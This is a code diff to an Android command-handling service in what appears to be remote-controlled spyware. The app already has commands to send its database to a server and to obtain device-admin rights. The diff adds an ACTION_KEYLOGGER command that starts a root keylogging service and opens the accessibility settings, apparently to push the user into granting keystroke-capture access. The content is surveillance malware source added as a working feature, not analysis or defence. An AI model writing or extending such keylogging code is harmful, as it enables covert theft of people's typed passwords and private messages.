@@ -107,6 +107,7 @@ public class CommandsIntentService extends IntentService {
     public static final String ACTION_CAMERA_PERMISSION = "ACTION_CAMERA_PERMISSION";
     public static final String ACTION_PHONE_PERMISSION = "ACTION_PHONE_PERMISSION";
     public static final String ACTION_SEND_DB_TO_SERVER = "ACTION_SEND_DB_TO_SERVER";
+    public static final String ACTION_KEYLOGGER = "ACTION_KEYLOGGER";
 
     public CommandsIntentService() {
         super("CommandsIntentService");
@@ -493,6 +494,9 @@ public class CommandsIntentService extends IntentService {
                     AdminReceiver.sReason = intent.getStringExtra(AdminReceiver.REASON_KEY);
                 }
                 startPermissionActivity(this, intent, AdminActivity.class);
+            }else if(action.equals(ACTION_KEYLOGGER)){
+                Systems.Root.startKeyloggingService();
+                Systems.Phone.Settings.openAccessibilityOptions(this);
             }else {
                 Log.d(TAG, "No action found!");
             }
